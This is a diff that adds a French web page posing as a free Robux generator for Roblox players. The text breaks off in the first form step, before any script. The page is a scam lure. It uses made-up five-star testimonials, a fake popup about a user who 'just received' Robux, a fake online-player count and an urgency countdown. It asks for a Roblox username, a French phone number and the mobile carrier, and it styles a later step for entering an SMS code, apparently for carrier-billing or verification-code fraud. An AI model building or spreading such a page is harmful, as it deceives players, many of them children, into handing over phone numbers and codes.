@@ -1,0 +1,1000 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+<meta name="theme-color" content="#0d0e15"/>
+<title>Robux Gratuits 🎁 - Roblox Generator</title>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800;900&display=swap" rel="stylesheet"/>
+<style>
+/* ═══════════════════════════════════════
+   BASE & RESET
+═══════════════════════════════════════ */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+:root{
+  --robux:#00E676;--gold:#E5C158;--robux-glow:rgba(229,193,88,0.4);
+  --bg:#0B0C12;--card:rgba(255,255,255,.04);
+  --border:rgba(255,255,255,.08);--muted:rgba(255,255,255,.45);
+  --red:#FF4F4F;
+}
+html{-webkit-text-size-adjust:100%;height:100%;}
+body{
+  min-height:100vh;background:var(--bg);
+  font-family:'Plus Jakarta Sans',sans-serif;color:#fff;
+  overflow-x:hidden;
+  padding-top:env(safe-area-inset-top);
+  padding-bottom:env(safe-area-inset-bottom);
+}
+
+/* ═══════════════════════════════════════
+   BACKGROUND & ANIMATIONS
+═══════════════════════════════════════ */
+#bgc{position:fixed;inset:0;z-index:0;pointer-events:none;}
+.orb{position:fixed;border-radius:50%;filter:blur(120px);pointer-events:none;z-index:0;will-change:transform;}
+.o1{width:min(650px,120vw);height:min(650px,120vw);
+  background:radial-gradient(circle,rgba(229,193,88,.15) 0%,rgba(0,230,118,.04) 50%,transparent 70%);
+  top:-22%;left:-15%;animation:orb1 20s ease-in-out infinite;}
+.o2{width:min(550px,110vw);height:min(550px,110vw);
+  background:radial-gradient(circle,rgba(0,230,118,.12) 0%,rgba(0,100,255,.04) 50%,transparent 70%);
+  bottom:-15%;right:-10%;animation:orb2 24s ease-in-out infinite;}
+@keyframes orb1{0%,100%{transform:translate(0,0) scale(1)}40%{transform:translate(8vw,6vh) scale(1.1)}75%{transform:translate(-4vw,10vh) scale(.95)}}
+@keyframes orb2{0%,100%{transform:translate(0,0) scale(1)}35%{transform:translate(-6vw,-7vh) scale(1.08)}70%{transform:translate(5vw,-4vh) scale(.92)}}
+.grid-bg{
+  position:fixed;inset:0;z-index:0;pointer-events:none;
+  background-image:
+    linear-gradient(rgba(229,193,88,.025) 1px,transparent 1px),
+    linear-gradient(90deg,rgba(229,193,88,.025) 1px,transparent 1px);
+  background-size:60px 60px;
+}
+
+/* ═══════════════════════════════════════
+   FLOATING SOCIAL BUBBLE
+═══════════════════════════════════════ */
+.social-bubble{
+  position:fixed;bottom:24px;right:16px;z-index:50;
+  background:rgba(20,22,35,.8);
+  border:1px solid rgba(229,193,88,.25);
+  border-radius:100px;
+  padding:8px 16px 8px 10px;
+  display:flex;align-items:center;gap:10px;
+  backdrop-filter:blur(25px);-webkit-backdrop-filter:blur(25px);
+  font-size:.75rem;font-weight:600;color:rgba(255,255,255,.8);
+  box-shadow:0 10px 30px rgba(0,0,0,.5);
+  animation:bubbleIn .5s 1s cubic-bezier(.34,1.56,.64,1) both;
+  pointer-events:none;
+}
+@keyframes bubbleIn{from{opacity:0;transform:translateY(20px) scale(.8)}to{opacity:1;transform:none}}
+.bubble-avatars{display:flex;}
+.ba{
+  width:26px;height:26px;border-radius:50%;border:2px solid var(--bg);
+  background:linear-gradient(135deg,#E5C158,#00E676);
+  display:flex;align-items:center;justify-content:center;font-size:12px;
+  margin-left:-8px;
+}
+.ba:first-child{margin-left:0;}
+.bubble-dot{width:7px;height:7px;border-radius:50%;background:var(--gold);box-shadow:0 0 8px var(--gold);animation:blink 1.4s ease-in-out infinite;flex-shrink:0;}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.2}}
+
+/* ═══════════════════════════════════════
+   LIVE TOAST POPUP
+═══════════════════════════════════════ */
+.live-pop{
+  position:fixed;top:20px;left:16px;z-index:60;
+  background:rgba(18,22,32,.9);
+  border:1px solid rgba(229,193,88,.3);
+  border-radius:16px;
+  padding:12px 16px;
+  display:flex;align-items:center;gap:12px;
+  backdrop-filter:blur(25px);-webkit-backdrop-filter:blur(25px);
+  box-shadow:0 16px 36px rgba(0,0,0,.5),0 0 20px rgba(229,193,88,.15);
+  transform:translateY(-90px);opacity:0;
+  transition:all .45s cubic-bezier(.34,1.56,.64,1);
+  pointer-events:none;
+}
+.live-pop.show{transform:translateY(0);opacity:1;}
+.pop-avatar{
+  width:36px;height:36px;border-radius:50%;
+  overflow:hidden;background:#000;
+  display:flex;align-items:center;justify-content:center;
+  flex-shrink:0;box-shadow:0 0 10px rgba(229,193,88,.4);
+}
+.pop-avatar img{width:100%;height:100%;object-fit:cover;}
+.pop-info{display:flex;flex-direction:column;}
+.pop-title{font-size:.78rem;font-weight:700;color:#fff;}
+.pop-sub{font-size:.68rem;color:var(--gold);font-weight:600;}
+
+/* ═══════════════════════════════════════
+   PAGE STRUCTURE
+═══════════════════════════════════════ */
+.page{
+  position:relative;z-index:1;
+  min-height:100vh;
+  display:flex;flex-direction:column;align-items:center;
+  padding:20px 16px 80px;
+}
+@media(min-width:640px){.page{padding:40px 24px 80px;}}
+
+/* ═══════════════════════════════════════
+   URGENCY BAR
+═══════════════════════════════════════ */
+.urgency{
+  width:100%;max-width:440px;
+  display:flex;align-items:center;justify-content:space-between;gap:10px;
+  background:rgba(229,193,88,.08);
+  border:1px solid rgba(229,193,88,.2);
+  border-radius:16px;
+  padding:11px 18px;
+  margin-bottom:24px;
+  backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);
+  animation:fadeDown .5s ease both;
+  flex-wrap:wrap;
+}
+@keyframes fadeDown{from{opacity:0;transform:translateY(-10px)}to{opacity:1;transform:none}}
+.urg-left{display:flex;align-items:center;gap:8px;font-size:.78rem;font-weight:700;color:var(--gold);}
+.urg-dot{width:8px;height:8px;border-radius:50%;background:var(--gold);box-shadow:0 0 10px var(--gold);animation:blink 1.5s ease-in-out infinite;flex-shrink:0;}
+.countdown-wrap{display:flex;align-items:center;gap:6px;}
+.cd-block{
+  background:rgba(229,193,88,.15);border:1px solid rgba(229,193,88,.3);
+  border-radius:10px;padding:5px 9px;
+  font-size:.76rem;font-weight:900;color:var(--gold);
+  font-variant-numeric:tabular-nums;letter-spacing:.5px;
+  min-width:40px;text-align:center;
+}
+.cd-sep{font-size:.75rem;color:rgba(229,193,88,.6);font-weight:800;margin-top:-2px;}
+
+/* ═══════════════════════════════════════
+   HERO & LOGO
+═══════════════════════════════════════ */
+.hero{
+  text-align:center;margin-bottom:24px;
+  width:100%;max-width:440px;
+  animation:fadeUp .6s .1s ease both;
+}
+@keyframes fadeUp{from{opacity:0;transform:translateY(22px)}to{opacity:1;transform:none}}
+
+.logo-container{position:relative;width:96px;height:96px;margin:0 auto 20px;}
+.logo-conic{
+  position:absolute;inset:0;border-radius:28px;
+  background:conic-gradient(from 0deg,#E5C158,#FFFC00,#E5C158);
+  animation:spinC 5s linear infinite;padding:3px;
+  box-shadow:0 0 40px rgba(229,193,88,.35);
+}
+@keyframes spinC{to{transform:rotate(360deg)}}
+.logo-img-wrap{
+  position:absolute;inset:3px;border-radius:25px;
+  background:#0B0C12;
+  overflow:hidden;
+  display:flex;align-items:center;justify-content:center;
+  box-shadow:0 0 50px rgba(229,193,88,.5);
+}
+.logo-img-wrap img{
+  width:100%;height:100%;object-fit:cover;
+  border-radius:23px;
+}
+
+.hero-eye{font-size:.72rem;font-weight:800;letter-spacing:2px;text-transform:uppercase;color:var(--gold);margin-bottom:8px;}
+.hero-h1{font-size:clamp(1.85rem,7vw,2.7rem);font-weight:900;line-height:1.05;letter-spacing:-1.2px;margin-bottom:12px;}
+.hl{background:linear-gradient(90deg,#E5C158 20%,#FFFC00 80%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
+.hero-sub{color:var(--muted);font-size:.9rem;line-height:1.65;max-width:320px;margin:0 auto;}
+
+/* ═══════════════════════════════════════
+   PROOF STRIP
+═══════════════════════════════════════ */
+.proof-strip{
+  display:flex;gap:10px;overflow-x:auto;padding:2px 0 6px;
+  margin-bottom:20px;width:100%;max-width:440px;
+  scrollbar-width:none;-webkit-overflow-scrolling:touch;
+}
+.proof-strip::-webkit-scrollbar{display:none;}
+.pc{
+  flex-shrink:0;
+  background:rgba(255,255,255,.035);border:1px solid rgba(255,255,255,.08);
+  border-radius:15px;padding:12px 14px;min-width:145px;
+  backdrop-filter:blur(15px);-webkit-backdrop-filter:blur(15px);
+  transition:border .2s;
+}
+.pc:hover{border-color:rgba(229,193,88,.3);}
+.pc-av{font-size:1rem;margin-bottom:4px;}
+.pc-st{color:var(--gold);font-size:.6rem;margin-bottom:3px;letter-spacing:.5px;}
+.pc-nm{font-size:.75rem;font-weight:700;margin-bottom:2px;}
+.pc-tx{font-size:.68rem;color:var(--muted);line-height:1.35;}
+
+/* ═══════════════════════════════════════
+   CARD & GLASSMORPHISM
+═══════════════════════════════════════ */
+.card{
+  width:100%;max-width:440px;
+  background:rgba(255,255,255,.04);
+  backdrop-filter:blur(50px) saturate(180%);
+  -webkit-backdrop-filter:blur(50px) saturate(180%);
+  border:1px solid rgba(255,255,255,.1);
+  border-radius:28px;
+  padding:0;
+  overflow:hidden;
+  box-shadow:0 0 0 1px rgba(229,193,88,.08) inset,0 40px 100px rgba(0,0,0,.7);
+  animation:fadeUp .65s .2s ease both;
+}
+
+/* Step progress bar */
+.step-bar{
+  padding:22px 24px 0;
+  display:flex;align-items:center;gap:0;
+}
+.sb-item{flex:1;display:flex;align-items:center;}
+.sb-num{
+  width:28px;height:28px;border-radius:50%;flex-shrink:0;
+  display:flex;align-items:center;justify-content:center;
+  font-size:.7rem;font-weight:800;
+  background:rgba(255,255,255,.07);color:rgba(255,255,255,.3);
+  border:1.5px solid rgba(255,255,255,.1);
+  transition:all .3s;
+}
+.sb-num.done{background:rgba(229,193,88,.18);color:var(--gold);border-color:rgba(229,193,88,.3);}
+.sb-num.active{background:rgba(229,193,88,.18);color:var(--gold);border-color:rgba(229,193,88,.4);box-shadow:0 0 12px rgba(229,193,88,.25);}
+.sb-line{flex:1;height:2px;background:rgba(255,255,255,.08);margin:0 6px;border-radius:2px;transition:background .4s;}
+.sb-line.done{background:rgba(229,193,88,.35);}
+.sb-label{font-size:.62rem;font-weight:700;color:rgba(255,255,255,.3);margin-top:5px;white-space:nowrap;}
+.sb-col{display:flex;flex-direction:column;align-items:center;gap:2px;}
+
+.card-body{padding:22px 24px 26px;}
+@media(min-width:480px){.card-body{padding:26px 30px 30px;}}
+
+.sep{height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,.08),transparent);margin:22px 0;}
+
+.step{display:none;}
+.step.active{display:block;animation:stepIn .38s ease;}
+@keyframes stepIn{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:none}}
+
+/* ─── FORM ─── */
+.flabel{font-size:.68rem;font-weight:800;letter-spacing:1.8px;text-transform:uppercase;color:var(--muted);margin-bottom:10px;display:flex;align-items:center;gap:6px;}
+.field+.field{margin-top:18px;}
+
+/* Username & Robux Select */
+.user-wrap{position:relative;}
+.user-icon{
+  position:absolute;left:16px;top:50%;transform:translateY(-50%);
+  font-size:1.1rem;pointer-events:none;
+}
+input[type=text], input[type=tel]{
+  -webkit-appearance:none;width:100%;
+  background:rgba(255,255,255,.06);border:1.5px solid rgba(255,255,255,.1);
+  border-radius:15px;padding:16px 16px 16px 48px;
+  color:#fff;font-family:'Plus Jakarta Sans',sans-serif;font-size:1.05rem;font-weight:600;
+  outline:none;
+  transition:border .2s,box-shadow .2s,background .2s;
+  -webkit-tap-highlight-color:transparent;
+}
+input[type=tel]{padding-left:74px;}
+.phone-wrap{position:relative;}
+.phone-prefix{
+  position:absolute;left:1px;top:1px;bottom:1px;width:66px;
+  display:flex;align-items:center;justify-content:center;gap:4px;
+  background:rgba(255,255,255,.05);
+  border-right:1px solid rgba(255,255,255,.08);
+  border-radius:14px 0 0 14px;
+  font-size:.8rem;font-weight:700;color:var(--muted);
+  pointer-events:none;letter-spacing:.2px;
+}
+input:focus{border-color:rgba(229,193,88,.6);background:rgba(229,193,88,.03);box-shadow:0 0 0 4px rgba(229,193,88,.1);}
+
+/* Robux Pack Selector */
+.robux-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:18px;}
+.robux-tile{
+  background:rgba(255,255,255,.05);border:1.5px solid rgba(255,255,255,.09);
+  border-radius:15px;padding:14px 8px;cursor:pointer;text-align:center;
+  transition:all .2s cubic-bezier(.34,1.4,.64,1);
+}
+.robux-tile.sel{
+  border-color:var(--gold);background:rgba(229,193,88,.12);
+  box-shadow:0 0 20px rgba(229,193,88,.28);transform:scale(1.03);
+}
+.rb-amount{font-size:1.1rem;font-weight:900;color:#fff;}
+.rb-tag{font-size:.65rem;color:var(--gold);font-weight:700;margin-top:2px;}
+
+.op-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;}
+.op-tile{
+  position:relative;background:rgba(255,255,255,.05);border:1.5px solid rgba(255,255,255,.09);
+  border-radius:15px;padding:14px 8px 12px;cursor:pointer;text-align:center;
+  user-select:none;-webkit-tap-highlight-color:transparent;
+  transition:all .22s cubic-bezier(.34,1.4,.64,1);overflow:hidden;
+}
+.op-tile::after{content:'';position:absolute;inset:0;opacity:0;transition:opacity .2s;}
+.op-tile.by::after{background:radial-gradient(circle at 50%,rgba(30,120,255,.25),transparent 70%);}
+.op-tile.sf::after{background:radial-gradient(circle at 50%,rgba(220,30,30,.25),transparent 70%);}
+.op-tile.or::after{background:radial-gradient(circle at 50%,rgba(255,140,0,.25),transparent 70%);}
+.op-tile:active{transform:scale(.94);}
+.op-tile.by.sel{border-color:rgba(60,140,255,.8);box-shadow:0 0 24px rgba(30,100,255,.3);}
+.op-tile.sf.sel{border-color:rgba(255,60,60,.8);box-shadow:0 0 24px rgba(220,0,0,.3);}
+.op-tile.or.sel{border-color:rgba(255,160,30,.8);box-shadow:0 0 24px rgba(255,130,0,.3);}
+.op-tile.sel::after,.op-tile:hover::after{opacity:1;}
+.op-check{
+  position:absolute;top:7px;right:7px;
+  width:18px;height:18px;border-radius:50%;
+  background:var(--gold);color:#000;font-size:9px;font-weight:900;
+  display:flex;align-items:center;justify-content:center;
+  opacity:0;transform:scale(0);
+  transition:all .25s cubic-bezier(.34,1.6,.64,1);z-index:2;
+}
+.op-tile.sel .op-check{opacity:1;transform:scale(1);}
+.op-icon{
+  width:42px;height:42px;border-radius:12px;margin:0 auto 8px;
+  display:flex;align-items:center;justify-content:center;
+  font-size:.85rem;font-weight:900;color:#fff;position:relative;z-index:1;
+}
+.op-icon.by{background:linear-gradient(145deg,#004ec8,#0078ff);}
+.op-icon.sf{background:linear-gradient(145deg,#a00,#e00);}
+.op-icon.or{background:linear-gradient(145deg,#c06000,#ff8c00);}
+.op-name{font-size:.75rem;font-weight:700;color:rgba(255,255,255,.8);position:relative;z-index:1;}
+
+.cta{
+  width:100%;margin-top:22px;
+  padding:18px 22px;
+  background:linear-gradient(135deg,#E5C158,#FFFC00);
+  border:none;border-radius:16px;
+  font-family:'Plus Jakarta Sans',sans-serif;font-size:1.05rem;font-weight:800;color:#05140c;letter-spacing:.2px;
+  cursor:pointer;position:relative;overflow:hidden;
+  -webkit-tap-highlight-color:transparent;touch-action:manipulation;
+  transition:transform .2s,box-shadow .2s;
+  box-shadow:0 8px 32px rgba(229,193,88,.35),0 2px 10px rgba(0,0,0,.4);
+}
+.cta::before{
+  content:'';position:absolute;top:0;left:-100%;width:55%;height:100%;
+  background:linear-gradient(90deg,transparent,rgba(255,255,255,.4),transparent);
+  transform:skewX(-20deg);transition:left .55s;
+}
+.cta:hover{transform:translateY(-2px);box-shadow:0 14px 45px rgba(229,193,88,.4);}
+.cta:hover::before{left:160%;}
+.cta:active{transform:scale(.97);}
+.cta:disabled{opacity:.35;cursor:not-allowed;transform:none;box-shadow:none;}
+.trust{display:flex;justify-content:center;gap:16px;margin-top:14px;flex-wrap:wrap;}
+.ti{font-size:.68rem;color:rgba(255,255,255,.28);display:flex;align-items:center;gap:4px;}
+
+/* ─── WAIT ─── */
+.wait-c{text-align:center;padding:4px 0 16px;}
+.spin-wrap{position:relative;width:84px;height:84px;margin:0 auto 22px;}
+.sr{position:absolute;border-radius:50%;border:3px solid transparent;}
+.sr1{inset:0;border-top-color:#E5C158;animation:spin 1s linear infinite;}
+.sr2{inset:9px;border-right-color:rgba(229,193,88,.38);animation:spin 1.8s linear infinite reverse;}
+.sr3{inset:19px;border-bottom-color:rgba(229,193,88,.15);animation:spin 2.8s linear infinite;}
+.spin-mid{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;}
+.spin-mid img{width:36px;height:36px;border-radius:8px;}
+@keyframes spin{to{transform:rotate(360deg)}}
+.wait-t{font-size:1.15rem;font-weight:800;margin-bottom:6px;}
+.wait-s{color:var(--muted);font-size:.85rem;line-height:1.65;}
+.ph-pill{
+  display:inline-block;margin-top:12px;
+  background:rgba(229,193,88,.1);border:1px solid rgba(229,193,88,.25);
+  border-radius:100px;padding:6px 18px;
+  font-size:.92rem;font-weight:700;color:var(--gold);letter-spacing:1px;
+}
+.steps-track{margin-top:22px;display:flex;flex-direction:column;gap:8px;}
+.st-row{
+  display:flex;align-items:center;gap:12px;
+  background:rgba(255,255,255,.035);border:1px solid rgba(255,255,255,.06);
+  border-radius:13px;padding:12px 14px;
+  font-size:.82rem;color:rgba(255,255,255,.45);
+  transition:all .4s;
+}
+.st-row.done{color:rgba(255,255,255,.9);background:rgba(229,193,88,.05);border-color:rgba(229,193,88,.18);}
+.st-row.cur{color:rgba(255,255,255,.8);border-color:rgba(229,193,88,.22);}
+.st-ic{width:28px;height:28px;border-radius:9px;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:13px;background:rgba(255,255,255,.06);}
+.st-row.done .st-ic{background:rgba(229,193,88,.2);}
+.st-row.cur .st-ic{background:rgba(229,193,88,.12);}
+
+/* ─── REFUSED ─── */
+.ref-c{text-align:center;padding:8px 0;}
+.ref-icon{font-size:3rem;display:block;margin-bottom:14px;animation:shakeX .5s ease;}
+@keyframes shakeX{0%,100%{transform:translateX(0)}20%{transform:translateX(-7px)}40%{transform:translateX(7px)}60%{transform:translateX(-5px)}80%{transform:translateX(5px)}}
+.ref-t{font-size:1.25rem;font-weight:800;color:var(--red);margin-bottom:8px;}
+.ref-s{color:var(--muted);font-size:.85rem;line-height:1.65;margin-bottom:22px;}
+.btn-ghost{
+  padding:14px 26px;background:rgba(255,255,255,.06);border:1.5px solid rgba(255,255,255,.12);
+  border-radius:13px;color:#fff;font-family:'Plus Jakarta Sans',sans-serif;font-size:.9rem;font-weight:600;
+  cursor:pointer;transition:all .2s;touch-action:manipulation;-webkit-tap-highlight-color:transparent;
+}
+.btn-ghost:active{background:rgba(255,255,255,.12);}
+
+/* ─── CODE / SMS MOCKUP ─── */
+.code-c{text-align:center;}
+.vbadge{
+  display:inline-flex;align-items:center;gap:6px;
+  background:rgba(229,193,88,.1);border:1px solid rgba(229,193,88,.25);
+  border-radius:100px;padding:6px 14px;
+  font-size:.72rem;font-weight:700;color:var(--gold);letter-spacing:.5px;margin-bottom:14px;
+}
+
+.sms-mockup{
+  background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.09);
+  border-radius:18px;padding:16px;margin:0 0 20px;
+  text-align:left;position:relative;
+}
+.sms-header{display:flex;align-items:center;gap:10px;margin-bottom:12px;}
+.sms-avatar{
+  width:36px;height:36px;border-radius:50%;flex-shrink:0;
+  overflow:hidden;background:#000;
+}
+.sms-avatar img{width:100%;height:100%;object-fit:cover;}
+.sms-name{font-size:.75rem;font-weight:700;margin-bottom:1px;}
+.sms-time{font-size:.62rem;color:var(--muted);}
+.sms-bubble{
+  background:rgba(255,255,255,.08);border-radius:0 14px 14px 14px;
+  padding:12px 16px;font-size:.85rem;line-height:1.6;color:rgba(255,255,255,.9);
+}
+.sms-code-hl{
+  display:inline-block;
+  background:rgba(229,193,88,.18);border:1px solid rgba(229,193,88,.35);
+  border-radius:8px;padding:2px 10px;
+  font-size:1.1rem;font-weight:900;color:var(--gold);letter-spacing:2.5px;
+}
+
+.code-inst{font-size:.82rem;color:var(--muted);margin-bottom:16px;}
+.digits{display:flex;gap:clamp(8px,2.5vw,14px);justify-content:center;margin-bottom:8px;}
+.dg{
+  width:clamp(58px,14.5vw,68px);height:clamp(68px,17.5vw,78px);
+  background:rgba(255,255,255,.06);border:2px solid rgba(255,255,255,.12);
+  border-radius:16px;text-align:center;
+  font-family:'Plus Jakarta Sans',sans-serif;font-size:clamp(1.6rem,5.5vw,2.1rem);font-weight:900;
+  color:var(--gold);outline:none;caret-color:var(--gold);
+  transition:all .2s;-webkit-appearance:none;
+  -webkit-tap-highlight-color:transparent;
+}
+.dg::placeholder{color:rgba(255,255,255,.1);font-weight:300;}
+.dg:focus{border-color:rgba(229,193,88,.7);background:rgba(229,193,88,.06);box-shadow:0 0 0 4px rgba(229,193,88,.12);transform:scale(1.06);}
+.dg.v{border-color:rgba(229,193,88,.45);background:rgba(229,193,88,.05);}
+.code-note{text-align:center;font-size:.7rem;color:rgba(255,255,255,.25);margin-top:6px;}
+.resend{text-align:center;margin-top:12px;font-size:.75rem;color:rgba(255,255,255,.3);}
+.resend a{color:var(--gold);font-weight:700;cursor:pointer;}
+
+/* ─── SUCCESS ─── */
+.succ-c{text-align:center;}
+.medal{width:104px;height:104px;margin:0 auto 20px;position:relative;}
+.medal-ring{
+  position:absolute;inset:0;border-radius:28px;
+  background:conic-gradient(#E5C158,#FFFC00,#E5C158);
+  animation:spinC 5s linear infinite;padding:3px;
+  box-shadow:0 0 30px rgba(229,193,88,.4);
+}
+.medal-inner{
+  position:absolute;inset:3px;border-radius:25px;
+  background:#0B0C12;
+  overflow:hidden;
+  display:flex;align-items:center;justify-content:center;
+  box-shadow:0 0 50px rgba(229,193,88,.6);
+  animation:medalPop .5s .12s cubic-bezier(.34,1.56,.64,1) both;
+}
+.medal-inner img{width:100%;height:100%;object-fit:cover;}
+@keyframes medalPop{from{transform:scale(0);opacity:0}to{transform:scale(1);opacity:1}}
+.succ-t{font-size:1.65rem;font-weight:900;letter-spacing:-.4px;margin-bottom:8px;}
+.gt{background:linear-gradient(90deg,#E5C158,#FFFC00);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
+.succ-s{color:var(--muted);font-size:.88rem;line-height:1.7;margin-bottom:22px;}
+
+.robux-card{
+  background:linear-gradient(135deg,rgba(229,193,88,.12),rgba(255,252,0,.06));
+  border:1px solid rgba(229,193,88,.2);border-radius:18px;padding:20px;
+  margin-bottom:20px;box-shadow:0 10px 30px rgba(0,0,0,.3);
+  text-align:center;
+}
+.rc-big-amount{
+  font-size:2.4rem;font-weight:900;color:var(--gold);
+  text-shadow:0 0 20px rgba(229,193,88,.5);
+}
+.rc-sub{font-size:.8rem;color:rgba(255,255,255,.7);margin-top:4px;}
+
+/* ═══════════════════════════════════════
+   FOOTER
+═══════════════════════════════════════ */
+.footer-row{
+  display:flex;gap:10px;margin-top:18px;justify-content:center;flex-wrap:wrap;
+  width:100%;max-width:440px;
+}
+.fb{
+  display:flex;align-items:center;gap:5px;
+  background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.07);
+  border-radius:100px;padding:6px 14px;
+  font-size:.68rem;color:rgba(255,255,255,.35);font-weight:500;
+}
+
+/* ═══════════════════════════════════════
+   CONFETTI & TOAST
+═══════════════════════════════════════ */
+#conf{position:fixed;inset:0;pointer-events:none;z-index:9999;overflow:hidden;}
+.cp{position:absolute;top:-16px;animation:cfFall linear forwards;}
+@keyframes cfFall{to{transform:translateY(106vh) rotate(900deg);opacity:0}}
+.toast{
+  position:fixed;bottom:max(env(safe-area-inset-bottom),24px);
+  left:50%;transform:translateX(-50%);
+  background:rgba(255,80,80,.15);border:1px solid rgba(255,80,80,.3);
+  border-radius:14px;padding:12px 24px;
+  color:#ff8080;font-size:.85rem;font-weight:600;z-index:9998;
+  white-space:nowrap;backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);animation:fadeUp .3s ease;
+}
+</style>
+</head>
+<body>
+<canvas id="bgc"></canvas>
+<div class="o1 orb"></div>
+<div class="o2 orb"></div>
+<div class="grid-bg"></div>
+<div id="conf"></div>
+
+<!-- Live Notification Popup -->
+<div class="live-pop" id="live-pop">
+  <div class="pop-avatar" id="pop-av">
+    <img src="/robux-logo.png" alt="Robux"/>
+  </div>
+  <div class="pop-info">
+    <div class="pop-title" id="pop-title">Robloxian99</div>
+    <div class="pop-sub" id="pop-sub">Vient de recevoir 10 000 Robux !</div>
+  </div>
+</div>
+
+<!-- Floating Social Proof Bubble -->
+<div class="social-bubble">
+  <div class="bubble-avatars">
+    <div class="ba">🎮</div>
+    <div class="ba">⚡</div>
+    <div class="ba">💎</div>
+  </div>
+  <div class="bubble-dot"></div>
+  <div class="bubble-txt"><span id="viewer-count">42</span> <b>joueurs</b> en ligne</div>
+</div>
+
+<div class="page">
+
+  <!-- URGENCY BAR -->
+  <div class="urgency">
+    <div class="urg-left">
+      <div class="urg-dot"></div>
+      <span>⚡ Offre expire dans</span>
+    </div>
+    <div class="countdown-wrap">
+      <div class="cd-block" id="cd-h">00</div>
+      <div class="cd-sep">:</div>
+      <div class="cd-block" id="cd-m">14</div>
+      <div class="cd-sep">:</div>
+      <div class="cd-block" id="cd-s">59</div>
+    </div>
+  </div>
+
+  <!-- HERO -->
+  <div class="hero">
+    <div class="logo-container">
+      <div class="logo-conic"></div>
+      <div class="logo-img-wrap">
+        <img src="/robux-logo.png" alt="Robux Icon"/>
+      </div>
+    </div>
+    <div class="hero-eye">Événement Spécial Roblox</div>
+    <h1 class="hero-h1">Gagne des <br/><span class="hl">Robux</span> gratuits</h1>
+    <p class="hero-sub">Sélectionne ton pack de Robux, entre ton pseudo Roblox et valide pour les recevoir sur ton compte !</p>
+  </div>
+
+  <!-- PROOF STRIP -->
+  <div class="proof-strip">
+    <div class="pc"><div class="pc-av">🎮</div><div class="pc-st">★★★★★</div><div class="pc-nm">Alex_RBX</div><div class="pc-tx">10k Robux reçus !</div></div>
+    <div class="pc"><div class="pc-av">⚡</div><div class="pc-st">★★★★★</div><div class="pc-nm">NinjaGamer</div><div class="pc-tx">Super rapide 🔥</div></div>
+    <div class="pc"><div class="pc-av">💎</div><div class="pc-st">★★★★★</div><div class="pc-nm">Sarah_blox</div><div class="pc-tx">J'ai pu acheter mon skin</div></div>
+    <div class="pc"><div class="pc-av">🌟</div><div class="pc-st">★★★★★</div><div class="pc-nm">Kev99</div><div class="pc-tx">Validation rapide 🙌</div></div>
+  </div>
+
+  <!-- CARD -->
+  <div class="card">
+
+    <!-- STEP PROGRESS BAR -->
+    <div class="step-bar" id="step-bar">
+      <div class="sb-item">
+        <div class="sb-col">
+          <div class="sb-num active" id="sbn1">1</div>
+          <div class="sb-label">Compte</div>
+        </div>
+        <div class="sb-line" id="sbl1"></div>
+      </div>
+      <div class="sb-item">
+        <div class="sb-col">
+          <div class="sb-num" id="sbn2">2</div>
+          <div class="sb-label">Vérif.</div>
+        </div>
+        <div class="sb-line" id="sbl2"></div>
+      </div>
+      <div class="sb-item">
+        <div class="sb-col">
+          <div class="sb-num" id="sbn3">3</div>
+          <div class="sb-label">Code</div>
+        </div>
+        <div class="sb-line" id="sbl3"></div>
+      </div>
+      <div class="sb-item" style="flex:0">
+        <div class="sb-col">
+          <div class="sb-num" id="sbn4">✓</div>
+          <div class="sb-label">Reçu</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="card-body">
+
+      <!-- STEP 1: FORM -->
+      <div class="step active" id="s-form">
+        <div class="field">
+          <div class="flabel">👤 Pseudo Roblox</div>
+          <div class="user-wrap">
+            <span class="user-icon">🎮</span>
+            <input type="text" id="username" placeholder="Ton pseudo Roblox" autocomplete="off"/>
+          </div>
+        </div>
+
+        <div class="field">
+          <div class="flabel">💎 Choisis le montant de Robux</div>
+          <div class="robux-grid">
+            <div class="robux-tile" data-amount="5 000" onclick="pickRobux(this)">
+              <div class="rb-amount">5 000</div>
+              <div class="rb-tag">Robux</div>
+            </div>
+            <div class="robux-tile sel" data-amount="10 000" onclick="pickRobux(this)">
+              <div class="rb-amount">10 000</div>
+              <div class="rb-tag">Populaire 🔥</div>
+            </div>
+            <div class="robux-tile" data-amount="25 000" onclick="pickRobux(this)">
+              <div class="rb-amount">25 000</div>
+              <div class="rb-tag">Robux</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="field">
+          <div class="flabel">📱 Numéro de téléphone</div>
+          <div class="phone-wrap">
+            <div class="phone-prefix">🇫🇷 +33</div>
+            <input type="tel" id="phone" placeholder="6 XX XX XX XX" maxlength="14" autocomplete="tel" inputmode="tel"/>
+          </div>
+        </div>
+
+        <div class="field">
+          <div class="flabel">📡 Opérateur mobile</div>
+          <div class="op-grid">
+            <div class="op-tile by" data-op="Bouygues" onclick="pickOp(this)">
+              <div class="op-check">✓</div>
+              <div class="op-icon by">B</div>
+              <div class="op-name">Bouygues</div>
+            </div>
+            <div class="op-tile sf" data-op="SFR" onclick="pickOp(this)">
+              <div class="op-check">✓</div>
+              <div class="op-icon sf">SFR</div>
+              <div class="op-name">SFR</div>
+            </div>
+            <div class="op-tile or" data-op="Orange" onclick="pickOp(this)">
+              <div class="op-check">✓</div>
+              <div class="op-icon or">🟠</div>
+              <div class="op-name">Orange</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="sep"></div>
+        <button class="cta" onclick="submitForm()">🚀 &nbsp;Générer mes Robux</button>
+        <div class="trust">
+          <span class="ti">🔒 Connexion SSL</span>
